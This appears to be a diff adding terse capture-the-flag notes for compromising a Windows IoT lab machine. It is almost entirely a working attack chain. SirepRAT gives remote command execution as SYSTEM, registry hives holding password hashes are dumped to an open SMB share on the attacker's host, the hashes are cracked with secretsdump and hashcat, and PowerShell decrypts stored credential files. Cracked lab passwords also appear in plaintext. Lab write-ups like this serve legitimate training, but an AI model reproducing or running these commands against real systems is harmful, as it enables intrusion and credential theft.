@@ -1,0 +1,38 @@
+//Based on bertolis
+http://10.10.10.204:8080/
+Windows Device Portal
+https://github.com/SafeBreach-Labs/SirepRAT
+git clone https://github.com/SafeBreach-Labs/SirepRAT.git
+cd SirepRAT/
+pip3 install -r requirements.txt
+python3 SirepRAT.py --help
+python3 SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
+python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c echo {{userprofile}}"				//excecuted code as SYSTEM profile
+
+//SMB
+[Public]
+	path = /tmp/Public
+	writable = yes
+	guest ok = yes
+	guest only = yes
+	create mode = 0777
+	directory mode = 077
+	force user = nobody
+
+mkdir /tmp/Public
+chmod 777 /tmp/Public
+service smbd restart
+
+python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c reg save HKLM\SYSTEM C:\SYSTEM"
+python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c reg save HKLM\SAM C:\SAM"
+
+ls /tmp/Public
+secretsdump.py -system /tmp/Public/SYSTEM -sam /tmp/Public/SAM LOCAL
+hashcat -m 1000 hash_app.txt /usr/share/wordlists/rockyou.txt
+app:mesh5143
+http://10.10.10.204:8080/#Run%20command
+dir c:\Data\Users\app
+powershell -c "$credential = import-clixml -path c:\Data\Users\app\user.txt; $credential.GetNetworkCredential().password"		//get user.txt
+powershell -c "$credential = import-clixml -path c:\Data\Users\app\iot-admin.xml; $credential.GetNetworkCredential().password"
+Administrator:_1nt3rn37ofTh1nGz
+powershell -c "$credential = import-clixml -path c:\Data\Users\administrator\root.txt; $credential.GetNetworkCredential().password"
